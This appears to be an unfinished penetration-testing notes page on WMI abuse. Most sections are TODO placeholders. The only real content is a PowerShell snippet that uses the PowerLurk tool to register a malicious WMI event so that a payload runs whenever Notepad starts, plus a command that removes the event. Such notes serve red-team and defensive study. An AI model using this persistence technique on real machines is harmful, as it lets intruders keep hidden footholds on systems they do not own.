# WMI Abuse
---

## Vulnerability

TODO: Describe the vulnerability here.

## Prerequisites

* TODO: List prerequisites here.

## Exploit

Using [PowerLurk](https://github.com/Sw4mpf0x/PowerLurk), execute the payload when notepad is opened.

```powershell
Import-Module .\PowerLurk.ps1
Register-MaliciousWmiEvent -EventName $name -PermanentCommand $executable -Trigger ProcessStart -ProcessName notepad.exe

# Remove the malicious WMI event.
Get-WmiEvent -Name $name | Remove-WmiObject
```

## Useful links

* TODO: List links here.

## Recommendations

- [ ] TODO: List recommendations here.